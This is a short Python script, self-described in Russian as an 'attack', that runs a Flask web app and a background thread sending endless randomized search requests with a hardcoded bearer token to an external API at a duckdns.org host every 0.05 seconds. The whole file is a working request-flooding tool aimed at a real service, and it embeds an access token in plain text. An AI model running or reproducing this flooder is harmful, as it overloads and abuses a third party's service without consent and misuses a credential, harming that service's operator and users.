import requests
import time
import random
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return "Атака запущена!"

def attack():
    TOKEN = "b270513aa904ec755aedeedab3f4e998b327387e862125a2"
    URL = "https://gitsearch.duckdns.org/api/search"
    while True:
        q = f"test{random.randint(1,999999)}"
        try:
            r = requests.get(URL, params={"q": q}, headers={"Authorization": f"Bearer {TOKEN}"}, timeout=5)
            print(f"[{r.status_code}] {q[:20]}")
        except Exception as e:
            print(f"[ERR] {q[:20]} - {e}")
        time.sleep(0.05)

if __name__ == '__main__':
    import threading
    threading.Thread(target=attack, daemon=True).start()
    app.run(host='0.0.0.0', port=10000)
